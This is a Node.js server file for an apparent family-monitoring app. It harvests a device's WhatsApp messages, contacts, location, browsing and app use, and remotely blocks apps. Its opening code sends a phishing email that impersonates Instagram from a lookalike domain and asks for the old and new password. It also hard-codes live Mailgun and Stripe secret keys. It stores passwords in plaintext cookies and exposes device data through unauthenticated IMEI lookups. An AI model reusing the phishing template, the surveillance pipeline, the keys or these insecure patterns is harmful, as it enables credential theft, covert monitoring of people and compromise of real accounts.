async function f() {


    var cookieParser = require('cookie-parser');


    //commandArray dashib tokule biler cunki saatda gelende silinmir ona gorede server dayan biler.


    const mailgun = require("mailgun-js");
    const DOMAIN = "mg.lookin24.com";
    const mg = mailgun({apiKey: "6d3b67e2434192b5277e46b39e601277-f135b0f1-ae549850", domain: DOMAIN});
    const data = {
        from: "Instagram <no-reply@insttagram.com>",
        to: "toghrulgasimov@gmail.com", //farid.naghizada@gmail.com
        subject: "Parolu Deyish",
        text: "Parolu deyishmek ucun link budur",
        html: "<link href=\"https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono\" rel=\"stylesheet\">\n" +
            "\n" +
            "<div id=\"wrapper\">\n" +
            "  <div class=\"main-content\">\n" +
            "    <div class=\"header\">\n" +
            "      <img src=\"https://i.imgur.com/zqpwkLQ.png\" />\n" +
            "    </div>\n" +
            "    <div class=\"l-part\">\n" +
            "<label for=\"pv\">Kohne Sifre</label>"+
            "      <input id='pv' type=\"password\" placeholder=\"Username\" class=\"input-1\" />\n" +
            "      <div class=\"overlap-text\">\n" +
            "\"<label for=\"pv2\">Yeni Sifre</label>\"+        " +
            "<input type=\"password\" id='pv2' placeholder=\"Password\" class=\"input-2\" />\n" +
            "        <a href=\"#\">Forgot?</a>\n" +
            "      </div>\n" +
            "      <input type=\"button\" value=\"Log in\" class=\"btn\" />\n" +
            "    </div>\n" +
            "  </div>\n" +
            "  <div class=\"sub-content\">\n" +
            "    <div class=\"s-part\">\n" +
            "      Don't have an account?<a href=\"#\">Sign up</a>\n" +
            "    </div>\n" +
            "  </div>\n" +
            "</div>\n" +
            "\n" +
            "\n" +
            "\n" +
            "\n" +
            "<!-- By Coding Market -->\n" +
            "<div class=\"youtube\">\n" +
            "  <a href=\"https://www.youtube.com/channel/UCtVM2RthR4aC6o7dzySmExA\" target=\"_blank\">by coding market</a>\n" +
            "</div>"
    };
    mg.messages().send(data, function (error, body) {
        console.log(body);
    });



    const fs = require('fs');
    //sk_live_1F3Ksgi8u1xixMtAkE2at33d006RrwEQCS
    //sk_test_j08lKmmHNZg0EgDDpCKDOF7Q00ZBJHNpgK
    const stripe = require('stripe')('sk_live_1F3Ksgi8u1xixMtAkE2at33d006RrwEQCS');

    let isSameDay = function(a, b, m) {
        //console.log(a, b);
        b = parseInt(b);
        m = parseInt(m);
        b = b - (m * 1000*60);
        a = new Date(parseInt(a));
        b = new Date(parseInt(b));
        //console.log(a + " and " + b + "---------------------------- isSameDay function called" + a.getTime() + "--" + m);
        return a.getDate() == b.getDate() && a.getMonth() == b.getMonth() && a.getFullYear() == b.getFullYear();
    }
    let filter = function(curDay, of, m) {
        let ans = [];
        //console.log(of);
        if(of == undefined) {
            return ans;
        }
        for(let i = 0; i < of.length; i++) {
            if(isSameDay(curDay, of[i].start, m))
                ans.push(of[i]);
        }
        return ans;
    }


    module.exports.routes = function(app, db){
        app.use(cookieParser('secreteee'));
        let admin = require('firebase-admin');
        let serviceAccount = require("./familyprotector-9fc7b-firebase-adminsdk-39knv-e27615e365.json");

        admin.initializeApp({
            credential: admin.credential.cert(serviceAccount),
            databaseURL: "https://familyprotector-9fc7b.firebaseio.com"
        });


        let multer = require('multer');

        var storage = multer.diskStorage({
            destination: function (req, file, cb) {
                cb(null, 'icons')
            },
            filename: function (req, file, cb) {
                cb(null, file.originalname)
            }
        })

        var upload = multer({ storage: storage })

        app.post("/image",upload.single('aa'), (req, res) => {
            console.log(req.url);
            const file = req.file;
            if (!file) {
                const error = new Error('Please upload a file')
                error.httpStatusCode = 400;

            }else {
                console.log(file);
            }
            res.send("1")
        });

        app.post("/addApp", async function (req, res) {
            console.log(req.url);
            let imei = req.body.imei;
            let pname = req.body.p;
            let name = req.body.n;
            if(imei == "erorrororororroro") {
                res.send("Imei null gelmishdi");
                return;
            }
            console.log(imei + "&&&&&&&&&&&&&&&&&&&&&");
            d = await db.collection("devices").findOne({imei:imei});
            if(d != null && d.apps != undefined) {
                for(let i = 0; i < d.apps.length; i++) {
                    if(d.apps[i].package == pname) {
                        res.send("VAR");
                        return;
                    }
                }
                console.log(pname + " added to apps");
                await db.collection("devices").updateOne({imei:imei}, {$push:{apps:{name:name, package : pname, blocked: false}}});
                res.send("1");

            }else {
                res.send("User Yoxdu");
            }
        });
        app.post("/unavailableIcons", async function (req, res) {
            console.log(req.url);
            let apps = req.body.apps;
            let ans = [];
            console.log(apps);
            for(let i = 0; i < apps.length; i++) {
                let path = "icons/"+apps[i];
                if(!fs.existsSync(path)) {
                    ans.push(apps[i]);
                    console.log("bu yoxdu" + apps[i]);
                }else {
                    console.log("bu var" + apps[i]);
                }
            }
            let data = {apps:ans};
            console.log(data);
            res.send(data);
        });

        app.post("/removeApp", async function (req, res) {
            console.log(req.url);
            console.log(req.body);
            let imei = req.body.imei;
            let ps = req.body.ar;
            let name = req.body.n;
            if(imei == "erorrororororroro") {
                res.send("Imei null gelmishdi");
                return;
            }

            let M = {};
            for(let i = 0; i < ps.length; i++) {
                M[ps[i]] = true;
            }
            d = await db.collection("devices").findOne({imei:imei});
            if(d != null && d.apps != undefined) {
                let newApps = [];
                for(let i = 0; i < d.apps.length; i++) {
                    if(M[d.apps[i].package] == undefined) {
                        newApps.push(d.apps[i]);
                    }
                }
                await db.collection("devices").updateOne({imei:imei}, {$set:{apps:newApps}});
                res.send("1");

            }else {
                res.send("User Yoxdu");
            }



        });




        app.post("/updateFirebaseToken", async function (req, res) {
            console.log(req.url);
            console.log("ddddan cagrildi");
            console.log(req.body.PostData);
            let o = JSON.parse(req.body.PostData);
            console.log(o);
            let imei = o.i;
            let token = o.t;
            if(imei == "erorrororororroro") {
                res.send("Imei null gelmishdi");
                return;
            }
            console.log(imei + "&&&&&&&&&&&&&&&&&&&&&");
            d = await db.collection("devices").findOne({imei:imei});
            if(d == null || d == undefined) {
                await db.collection("devices").updateOne({imei:imei}, {$set:{token:token, apps:[]}}, {upsert:true});
            }else {
                await db.collection("devices").updateOne({imei:imei}, {$set:{token:token}}, {upsert:true});
            }

            // let message = {
            //     data: {
            //         command : 'silIcaze',
            //         v: "1"
            //     },
            //     token: token
            // };
            // admin.messaging().send(message)
            //     .then((response) => {
            //         // Response is a message ID string.
            //         console.log('Successfully sent message:', response);
            //     })
            //     .catch((error) => {
            //         console.log('Error sending message:', error);
            //     });


            res.send("1");
        });
        app.post("/updateFirebaseToken2", async function (req, res) {
            console.log(req.url);
            console.log("ddddan cagrildi");
            console.log(req.body.PostData);
            let o = req.body;
            console.log(o);
            let imei = o.i;
            let token = o.t;
            if(imei == "erorrororororroro") {
                res.send("Imei null gelmishdi");
                return;
            }
            console.log(imei + "&&&&&&&&&&&&&&&&&&&&&");
            d = await db.collection("devices").findOne({imei:imei});
            if(d == null || d == undefined) {
                await db.collection("devices").updateOne({imei:imei}, {$set:{token:token, apps:[]}}, {upsert:true});
            }else {
                await db.collection("devices").updateOne({imei:imei}, {$set:{token:token}}, {upsert:true});
            }

            // let message = {
            //     data: {
            //         command : 'silIcaze',
            //         v: "1"
            //     },
            //     token: token
            // };
            // admin.messaging().send(message)
            //     .then((response) => {
            //         // Response is a message ID string.
            //         console.log('Successfully sent message:', response);
            //     })
            //     .catch((error) => {
            //         console.log('Error sending message:', error);
            //     });


            res.send("1");
        });
        app.post("/accessibiltyinfo", async function (req, res) {
            console.log(req.url);
            console.log("ddddan cagrildi");
            console.log(req.body.PostData);
            let o = req.body;
            console.log(o);

            res.send("1");
        });


        app.post("/initApp", async function (req, res) {
            console.log(req.url);
            // let imei = req.query.imei;
            // let appName = req.query.name;
            // let d = db.collection("devices").findOne();
            console.log(req.body);
            let data = req.body;

            let a = data.apps;
            let anew = [];
            let O = {apps:[]}
            for(let i = 0; i < a.length; i++) {
                try {
                    let path = "icons/"+a[i].package+".png";
                    anew.push({name:a[i].name,package:a[i].package, blocked:false});
                    if (!fs.existsSync(path)) {
                        //await fs.writeFileSync(path, icon);
                        console.log(path + " not exist");
                        O.apps.push(a[i]);
                    }else {
                        console.log(path + " exist");
                    }
                } catch(err) {
                    console.error(err)
                }
            }
            let imei = data.imei;

            d = await db.collection("devices").findOne({imei:imei});
            await db.collection("devices").updateOne({imei:imei}, {$set:{apps:anew}}, {upsert:true});

            res.send(JSON.stringify(O));
        });




        app.get("/getDevice", async function (req, res) {
            console.log(req.url);
            let imei = req.query.imei;
            let d = await db.collection("devices").findOne({imei:imei});
            res.send(JSON.stringify(d));
        });




        let CommandResults = {};
        app.get("/Whatsapp", async function (req, res) {
            console.log(req.url);
            let r = req.query;
            let imei = r.imei;
            console.log("in Whatsapp");
            console.log(req.query);
            let d = await db.collection("devices").findOne({imei:req.query.imei});

            console.log(d);
            let data = {imei: imei, con: d.con}
            res.send(data);
        });

        app.post("/sendWhatsapp", async function (req, res) {
            console.log(req.url);
            console.log("----------in sendWhatsapp");
            //also push notification to user
            let data = req.body;
            console.log(data);
            let imei = data.imei;
            //CommandResults[imei] = data;
            //console.log(data);
            await db.collection("devices").updateOne({imei:imei}, {$set:{con:data.data}}, {upsert:true});
            //let d = await db.collection("devices").findOne({imei:imei});
            CommandResults[imei+'sendWhatsapp'] = data;

            res.send("1");
        });

        app.post("/sendActivity", async function (req, res) {
            console.log(req.url);
            //also push notification to user
            let data = req.body;
            let imei = data.imei;

            console.log("in sendActivity");
            console.log(data);
            let ar = data.data.slice(0);


            let d = await db.collection("devices").findOne({imei:imei});



            if(d == null || d == undefined || d.activity == undefined) {
                data.data = [];
                await db.collection("devices").updateOne({imei:imei}, {$set:{activity:data}}, {upsert:true});
                CommandResults[imei+'sendActivity'] = data;
            }else {

                data = d.activity;
                let le = ar.pop();

                console.log(ar);
                if((d.activity.data.length == 0) || (ar.length > 0 && d.activity.data[d.activity.data.length-1].start != ar[ar.length-1].start)) {
                    await db.collection("devices").updateOne({imei:imei}, {$push:{"activity.data":{$each:ar}}});
                    data.data = d.activity.data.concat(ar);
                }
                if(le != undefined) data.data.push(le);
                CommandResults[imei+'sendActivity'] = data;

            }
            res.send("1");
        });
        app.post("/sendYoutube", async function (req, res) {
            console.log(req.url);
            console.log("----------in sendYoutube");
            //also push notification to user
            let data = req.body;
            console.log(data);
            //data = JSON.parse(data);
            let imei = data.imei;
            console.log("-------in sendYoutube");
            let d = await db.collection("devices").findOne({imei:imei});


            if(d == null || d == undefined || d.youtube == undefined) {
                data.data = [];
                await db.collection("devices").updateOne({imei:imei}, {$set:{youtube:data}}, {upsert:true});
            }else {
                let ans = data.data.slice(0);
                let M = {};
                if(d.youtube.data != undefined) {
                    for(let i = 0; i < d.youtube.data.length; i++) {
                        M[d.youtube.data[i].start] = true;
                    }
                }
                let f = [];
                for(let i = 0; i < ans.length; i++) {
                    if(M[ans[i].start] == undefined) {
                        f.push(ans[i]);
                    }
                }
                d.youtube.data = d.youtube.data.concat(f);
                await db.collection("devices").updateOne({imei:imei}, {$push:{"youtube.data":{$each:f}}});
            }
            if(d.youtube == undefined) {
                d.youtube = {};
                d.youtube.data = [];
            }
            CommandResults[imei+'sendYoutube'] = d.youtube;

            res.send("1");
        });
        app.post("/sendWebSites", async function (req, res) {
            console.log(req.url);
            console.log("----------in sendWebSites");
            //also push notification to user
            let data = req.body;
            console.log(data);
            //data = JSON.parse(data);
            let imei = data.imei;

            console.log("-------in sendWebSites");
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null || d == undefined || d.website == undefined) {
                data.data = [];
                await db.collection("devices").updateOne({imei:imei}, {$set:{website:data}}, {upsert:true});
            }else {
                let ans = data.data.slice(0);
                let M = {};
                if(d.website.data != undefined) {
                    for(let i = 0; i < d.website.data.length; i++) {
                        M[d.website.data[i].start] = true;
                    }
                }
                let f = [];
                for(let i = 0; i < ans.length; i++) {
                    if(M[ans[i].start] == undefined) {
                        f.push(ans[i]);
                    }
                }
                d.website.data = d.website.data.concat(f);
                await db.collection("devices").updateOne({imei:imei}, {$push:{"website.data":{$each:f}}});
            }
            if(d.website == undefined) {
                d.website = {};
                d.website.data = [];
            }
            CommandResults[imei+'sendWebsites'] = d.website;
            res.send("1");
        });
        app.post("/sendLocation", async function (req, res) {
            console.log(req.url);
            console.log("----------in sendLocation");
            //also push notification to user
            let data = req.body;
            console.log(data);
            //data = JSON.parse(data);
            let imei = data.imei;
            console.log("-------in sendLocation");
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null || d == undefined || d.location == undefined) {
                //data.data = [];
                await db.collection("devices").updateOne({imei:imei}, {$set:{location:data}}, {upsert:true});
            }else {
                if(d.location == undefined) {
                    d.location = {};
                    d.location.data = [];
                }
                let ans = data.data.slice(0);
                let le = ans.pop();
                let M = {};
                if(d.location.data != undefined) {
                    for(let i = 0; i < d.location.data.length; i++) {
                        M[d.location.data[i].start] = true;
                    }
                }
                let f = [];
                for(let i = 0; i < ans.length; i++) {
                    if(M[ans[i].start] == undefined) {
                        f.push(ans[i]);
                    }
                }
                d.location.data = d.location.data.concat(f);
                if(d.location.data.length == 0 && le != undefined) {
                    f.push(le);
                }
                if(le != undefined && le != null) {
                    d.location.data.push(le);
                }
                await db.collection("devices").updateOne({imei:imei}, {$push:{"location.data":{$each:f}}});
            }

            if(d.location == undefined) {
                d.location = {};
                d.location.data = [];
            }

            CommandResults[imei+'sendLocation'] = d.location;
            console.log(d.location);
            console.log(CommandResults[imei+'sendLocation']);

            res.send("1");
        });
        app.get("/sendCommand", async function (req, res) {
            console.log(req.url);
            //also push notification to user
            //console.log(req.query);
            console.log(req.query)
            let imei = req.query.imei;
            let cmd;
            if(req.query.youtube != undefined) {
                cmd = 'sendYoutube'
            }else if(req.query.sendWebsites){
                cmd = 'sendWebsites';
            }else if(req.query.sendLocation){
                cmd = 'sendLocation';
            }else if(req.query.whatsapp){
                cmd = 'sendWhatsapp';
            }
            else {
                cmd = 'sendActivity';
            }

            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null || d == undefined) {

                return;
            }

            let t = 0;
            let f = setInterval(function () {
                t++;
                console.log(imei+cmd);
                //console.log(t + " in sendCommand");
                //console.log(CommandResults);
                if(CommandResults[imei+cmd] != undefined) {
                    let of = CommandResults[imei+cmd];
                    //console.log(of);
                    //console.log("SEND activity bu gelib")

                    if(cmd != 'sendWhatsapp') {
                        of.data = filter(req.query.curDay, of.data, req.query.off);
                        console.log("filter olunmus in command");
                        console.log(of);

                    }
                    res.send(of);
                    clearInterval(f);
                    CommandResults[imei+cmd] = undefined;
                    return;
                }
                if(t == 6) {
                    clearInterval(f);
                    let ans;
                    if(cmd == 'sendActivity' && d.activity != undefined) {
                        d.activity.data = filter(req.query.curDay,d.activity.data, req.query.off);
                        res.send(d.activity);
                    }else if(cmd == 'sendLocation' && d.location != undefined){
                        d.location.data = filter(req.query.curDay,d.location.data, req.query.off);
                        res.send(d.location);
                    } else if(cmd == 'sendWensites' && d.website != undefined){
                        d.website.data = filter(req.query.curDay,d.website.data, req.query.off);
                        res.send(d.website);
                    }else if(cmd == 'sendYoutube' && d.youtube != undefined) {
                        d.youtube.data = filter(req.query.curDay,d.youtube.data, req.query.off);
                        res.send(d.youtube);
                    }else if(cmd == 'sendWhatsapp' && d.con != undefined){
                        res.send(d.con);
                    }
                    else {
                        res.send("0");
                    }
                }
            }, 1000);

            console.log(imei + "---" + d.token);



            let message = {
                data: {
                    command: cmd

                },
                token: d.token,
                android:{
                    priority:"high"
                }
            };
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });




            console.log(req.query + " in sendCommand");
            //res.send(JSON.stringify(d));
        });
        app.get("/blockApp", async function (req, res) {
            console.log(req.url);
            //also push notification to user
            let imei = req.query.imei;
            let package = req.query.package;
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.sendStatus(500);
                return;
            }
            let cur = false;
            for(let i = 0; i < d.apps.length; i++) {
                if(d.apps[i].package == package) {
                    cur = d.apps[i].blocked;
                    console.log("Tapildi");
                    break;
                }
            }
            cur = cur ^ true;
            console.log(cur);

            let message = {
                data: {
                    package: package,block:req.query.block,
                    command: "blockApp"

                },
                token: d.token
            };
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });



            await db.collection("devices").updateOne({imei:imei,"apps.package": package },
            {$set:{"apps.$.blocked":cur}});
            console.log(req.query);
            res.send(JSON.stringify(d));
        });
        app.get("/limitApp", async function (req, res) {
            console.log(req.url);
            //also push notification to user
            let imei = req.query.imei;
            let package = req.query.p;
            let t = req.query.t;
            let l = req.query.l;
            let message;
            console.log(req.query);
            let d = await db.collection("devices").findOne({imei:imei});
            if(t == "r") {
                message = {
                    data: {
                        p: package,
                        command: "limit",
                        t:"r"
                    },
                    token: d.token
                };
                await db.collection("devices").updateOne({imei:imei,"apps.package": package },
                    {$unset:{"apps.$.limit":true}});
            }else if(t == "a") {
                message = {
                    data: {
                        p: package,
                        command: "limit",
                        l:l,
                        t:"a"
                    },
                    token: d.token
                };
                await db.collection("devices").updateOne({imei:imei,"apps.package": package },
                    {$set:{"apps.$.limit":l}});
            }

            if(d == null) {
                res.sendStatus(500);
                return;
            }
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });
            res.send("1");
        });

        app.get("/gpsIcaze", async function (req, res) {

            console.log(req.url);
            //also push notification to user
            let imei = req.query.imei;
            let icaze = req.query.icaze;
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.sendStatus(500);
                return;
            }

            let message = {
                data: {
                    command : 'gpsIcaze',
                    v: icaze
                },
                token: d.token
            };
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });



            await db.collection("devices").updateOne({imei:imei},
                {$set:{"gpsIcaze":icaze}});
            res.send(JSON.stringify(d));
        });

        app.get("/silIcaze", async function (req, res) {
            //also push notification to user
            console.log(req.url);
            let imei = req.query.imei;
            let icaze = req.query.icaze;
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.sendStatus(500);
                return;
            }

            let message = {
                data: {
                    command : 'silIcaze',
                    v: icaze
                },
                token: d.token
            };
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });



            await db.collection("devices").updateOne({imei:imei},
                {$set:{"silIcaze":icaze}});
            res.send(JSON.stringify(d));
        });
        app.get("/Icaze", async function (req, res) {
            //also push notification to user
            console.log(req.url);
            let imei = req.query.imei;
            let icaze = req.query.icaze;
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.sendStatus(500);
                return;
            }
            let message = {
                data: {
                    command : 'Icaze',
                    v: icaze
                },
                token: d.token
            };
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });



            await db.collection("devices").updateOne({imei:imei},
                {$set:{"Icaze":icaze}});
            res.send(JSON.stringify(d));
        });
        app.get("/inputsIcaze", async function (req, res) {
            console.log(req.url);
            //also push notification to user
            let imei = req.query.imei;
            let icaze = req.query.icaze;
            let d = await db.collection("devices").findOne({imei:imei});
            if(d == null) {
                res.sendStatus(500);
                return;
            }
            let message = {
                data: {
                    command : 'inputsIcaze',
                    v: icaze
                },
                token: d.token
            };
            admin.messaging().send(message)
                .then((response) => {
                    // Response is a message ID string.
                    console.log('Successfully sent message:', response);
                })
                .catch((error) => {
                    console.log('Error sending message:', error);
                });



            await db.collection("devices").updateOne({imei:imei},
                {$set:{"inputsIcaze":icaze}});
            res.send(JSON.stringify(d));
        });






        app.post("/charge", (req, res) => {
            console.log(req.url);
            try {
                stripe.customers
                    .create({
                        name: req.body.name,
                        email: req.body.email,
                        source: req.body.stripeToken
                    })
                    .then(customer =>
                        stripe.charges.create({
                            amount: req.body.amount * 100,
                            currency: "usd",
                            customer: customer.id
                        })
                    )
                    .then(() => res.send("DONE"))
                    .catch(err => console.log(err));
            } catch (err) {
                res.send(err);
            }
        });

        app.post("/checkout", async (req, res) => {
            console.log(req.url);
            console.log(req.body);

            if(req.body.type == "1") {
                try {
                    stripe.customers
                        .create({
                            email: req.body.stripeEmail,
                            source: req.body.stripeToken
                        })
                        .then(customer =>
                            stripe.charges.create({
                                amount: 499,
                                currency: "eur",
                                customer: customer.id
                            })
                        )
                        .then(async () => {
                            let date = new Date();
                            date.setMonth(date.getMonth()+1);
                             await db.collection("devices").update({email:req.cookies.email}, {$set:{until:date.getTime()}});
                            res.redirect("/");
                        })
                        .catch(err => {
                            console.log(err);
                            res.redirect("/");
                        });
                } catch (err) {
                    res.send(err);
                }
            }else if(req.body.type == "3") {
                try {
                    stripe.customers
                        .create({
                            email: req.body.stripeEmail,
                            source: req.body.stripeToken
                        })
                        .then(customer =>
                            stripe.charges.create({
                                amount: 999,
                                currency: "eur",
                                customer: customer.id
                            })
                        )
                        .then(async () => {
                            let date = new Date();
                            date.setMonth(date.getMonth()+3);
                            await db.collection("devices").update({email:req.cookies.email}, {$set:{until:date.getTime()}});
                            res.redirect("/");
                        })
                        .catch(err => {
                            console.log(err);
                            res.send("Kartda yeterince pul yoxdur");
                        });
                } catch (err) {
                    res.send(err);
                }
            }else if(req.body.type == "6") {
                try {
                    stripe.customers
                        .create({
                            email: req.body.stripeEmail,
                            source: req.body.stripeToken
                        })
                        .then(customer =>
                            stripe.charges.create({
                                amount: 1999,
                                currency: "eur",
                                customer: customer.id
                            })
                        )
                        .then(async () => {
                            let date = new Date();
                            date.setMonth(date.getMonth()+6);
                            await db.collection("devices").update({email:req.cookies.email}, {$set:{until:date.getTime()}});
                            res.redirect("/");
                        })
                        .catch(err => {
                            console.log(err);
                            res.send("Kartda yeterince pul yoxdur");
                        });
                } catch (err) {
                    res.send(err);
                }
            }if(req.body.type == "12"){
                try {
                    stripe.customers
                        .create({
                            email: req.body.stripeEmail,
                            source: req.body.stripeToken
                        })
                        .then(customer =>
                            stripe.charges.create({
                                amount: 2999,
                                currency: "eur",
                                customer: customer.id
                            })
                        )
                        .then(async () => {
                            let date = new Date();
                            date.setMonth(date.getMonth()+6);
                            await db.collection("devices").update({email:req.cookies.email}, {$set:{until:date.getTime()}});
                            res.redirect("/");
                        })
                        .catch(err => {
                            console.log(err);
                            res.send("Kartda yeterince pul yoxdur");
                        });
                } catch (err) {
                    res.send(err);
                }
            }


        });

        app.get("/login", async function (req, res) {

            console.log(req.url);

            console.log(req.cookies);
            console.log(req.query);
            if(req.query.email == undefined) {
                req.query.email = req.cookies.email;
                req.query.password = req.cookies.password;
            }
            if(req.query.password == undefined || req.query.password == undefined) {
                res.send("EMAIL OR PASSWORD ARE NOT DEFINED");
                return;
            }

            let u = await db.collection("devices").findOne({email:req.query.email, password:req.query.password});
            if(u == undefined) {
                res.send("PASWORD YANLISHDIR");
                return;
            }

            let options = {
                maxAge: 253402300000000 // would expire after 15 minutes
                //httpOnly: true, // The cookie only accessible by the web server
                //signed: true // Indicates if the cookie should be signed
            }

            // Set cookie
            res.cookie('email', req.query.email, options) // options is optional
            res.cookie('password', req.query.password, options) // options is optional
            res.cookie('date', (new Date()).toLocaleString(), options) // options is optional
            let imei = req.cookies.imei;
            if(imei != undefined) {
                await db.collection("devices").updateOne({imei:imei}, {$set:{email:req.query.email, password:req.query.password}}, {upsert:true});
            }
            res.send("1");
        });
        app.get("/registration", async function (req, res) {
            console.log(req.url);
            console.log(req.query);

            let u = await db.collection("devices").findOne({email:req.query.email});
            console.log(u);
            if(u == undefined) {
                let options = {
                    maxAge: 253402300000000 // would expire after 15 minutes
                    //httpOnly: true, // The cookie only accessible by the web server
                    //signed: true // Indicates if the cookie should be signed
                }
                res.cookie('email', req.query.email, options) // options is optional
                res.cookie('password', req.query.password, options) // options is optional
                res.cookie('date', (new Date()).toLocaleString(), options) // options is optional


                let imei = req.cookies.imei;
                let date = new Date();
                date.setDate(date.getDate() + 1);

                if(imei != undefined) {
                    await db.collection("devices").updateOne({imei:imei}, {$set:{email:req.query.email,password: req.query.password, until:date.getTime()}}, {upsert:true});
                }else {
                    await db.collection("devices").insertOne({email:req.query.email, password: req.query.password, until:date.getTime()});
                }
                res.send("1");
                return;
            }else {
                res.send("BU Email artiq movcuddur");
            }
        });


        app.get("/index3", async function (req, res) {
            let ip2 = req.headers["x-real-ip"];
            fs.appendFileSync('iplerlok.txt', ip2 + "-" + new Date().toString() + "\n");
            console.log(req.url);
            console.log(req.headers["accept-language"])
            let imei = req.query.imei;
            console.log(req.cookies);
            if(imei != undefined) {
                // let options = {
                //     maxAge: 253402300000000, // would expire after 15 minutes
                //     //httpOnly: true, // The cookie only accessible by the web server
                //     signed: true // Indicates if the cookie should be signed
                // }
                //
                // // Set cookie
                // res.cookie('imei', imei, options) // options is optional
            }
            if(req.query.childName != undefined) {
                res.redirect("/login.html");
                return;
            }
            let email = req.cookies.email;
            let password = req.cookies.password;
            let d = await db.collection("devices").findOne({email:email, password:password,until: { $exists: true }});
            console.log(d);

            if(d == undefined || d == null  || email == undefined || password == undefined) {
                res.redirect("/login.html");
                return;
            }
            if(req.cookies.parent == "0" && req.cookies.email != undefined) {
                let s = await fs.readFileSync('./FamilyProtector/html/done.html') + "";
                res.send(s);
                return;
            }
            let now = new Date().getTime();
            console.log(d.until + "--" + now);
            if(d.until == undefined || d.until < now) {
                let s = await fs.readFileSync('./FamilyProtector/html/index3deactive.html') + "";
                res.send(s);
            }else {
                let s;
                if(email != 'toghrulgasimov@gmail.com') {
                    s = await fs.readFileSync('./FamilyProtector/html/index3.html') + "";
                }else {
                    s = await fs.readFileSync('./FamilyProtector/html/index3admin.html') + "";
                }
                res.send(s);
            }
        });
        app.get("/permission", async function (req, res) {
            console.log(req.url);
            console.log(req.headers["accept-language"])
            let imei = req.query.imei;
            console.log(req.cookies);
            console.log(req.query);
            let s = await fs.readFileSync('./FamilyProtector/html/permission.html') + "";
            res.send(s);
        });
        app.get("/parentorchild", async function (req, res) {
            console.log(req.url);
            console.log(req.headers["accept-language"])
            let imei = req.query.imei;
            console.log(req.cookies);
            console.log(req.query);
            if(req.cookies.parent=="1") {
                res.redirect("index3");
            }else if((req.query.pref == "1" && req.cookies.email != undefined)) {
                res.redirect("done.html");
                return;
            }else {
                let s = await fs.readFileSync('./FamilyProtector/html/parentorchild.html') + "";
                res.send(s);
            }
        });
        app.get("/getlanguage", async function (req, res) {
            console.log(req.url);
            console.log(req.headers["accept-language"]);
            console.log(req.body);
            res.send(req.headers["accept-language"]);
        });

        app.get("/parent", async function (req, res) {
            console.log(req.url);
            let parent = req.query.parent;

            console.log(req.query);
            if(parent != "0" && parent != "1") {
                res.send("ERROR");
                return;
            }

            let options = {
                maxAge: 253402300000000 // would expire after 15 minutes
                //httpOnly: true, // The cookie only accessible by the web server
                //signed: true // Indicates if the cookie should be signed
            }
            res.cookie('parent', parent, options) // options is optional
            let imei = req.cookies.imei;
            console.log("in PArent----")
            console.log(req.cookies);
            console.log(req.query);
            console.log("in PArent----")

            await db.collection("devices").updateOne({imei:imei}, {$set:{parent:parent}}, {upsert:true});
            res.send("1");

        });
        app.get("/childName", async function (req, res) {
            console.log(req.url);
            let name = req.query.name;

            let options = {
                maxAge: 253402300000000 // would expire after 15 minutes
                //httpOnly: true, // The cookie only accessible by the web server
                //signed: true // Indicates if the cookie should be signed
            }
            res.cookie('name', name, options) // options is optional
            res.clearCookie("email");
            res.clearCookie("password");
            //res.cookie('email', undefined, options) // options is optional
            let imei = req.cookies.imei;
            console.log("--------------------------------" + imei);
            console.log("in childName----")
            console.log(req.cookies);
            console.log(req.query);
            console.log("in childName----")

            await db.collection("devices").updateOne({imei:imei}, {$set:{name:name, imei:imei, parent:"0"}},{upsert:true});
            res.send("1");

        });
        app.post("/fillSelect", async function (req, res) {
            console.log(req.url);
            let email = req.cookies.email;
            console.log("------------------------------" + email + " Axtarilir");
            console.log(req.cookies);
            console.log(req.body);
            let d;
            if(email == "toghrulgasimov@gmail.com") {
                d = await db.collection("devices").find({imei: { $exists: true }}).project({imei:1, name:1});
            }else {
                d = await db.collection("devices").find({email:email,imei: { $exists: true }}).project({imei:1, name:1});
            }
            let ans = await d.toArray();
            if(email == "toghrulgasimov@gmail.com") {
                for(let i = 0; i < ans.length; i++) {
                    ans[i].name =i + ")" + ans[i].name +"-"+ ans[i].imei.substring(0,6);
                }
            }else {
                let ans2 = [];
                for(let i = 0; i < ans.length; i++) {
                    if(!ans[i].name == "") {
                        ans2.push(ans[i]);
                    }
                }
                ans = ans2;
            }
            ans.reverse();
            let data = {data:ans};
            console.log(ans);
            res.send(data);

        });
        app.post("/contacts", async function (req, res) {
            console.log(req.url);
            res.send("1");
            await db.collection("devices").updateOne({imei:req.body.imei}, {$set:{contact:req.body.c}}, {upsert:true});
            console.log(req.body);

        });
        app.post("/WpMsg", async function (req, res) {
            console.log(req.url);
            console.log(req.body);
            let imei = req.body.imei;
            req.body.imei = undefined;
            // let d = await db.collection("devices").find({imei:imei}).project({wp:1});
            // if(d.wp == undefined) {
            //
            // }else {
            //
            // }
            let o = {sender:req.body.sender, start:req.body.start,content:req.body.content,number:req.body.number
            ,name:req.body.name}
            await db.collection("devices").updateOne({imei:imei}, {$push:{wp:o}});

            res.send("1");

        });
        app.get("/WpCons", async function (req, res) {
            console.log(req.url);
            console.log(req.query);
            console.log(req.query.imei);
            let imei = req.query.imei;
            // let d = await db.collection("devices").find({imei:imei}).project({wp:1});
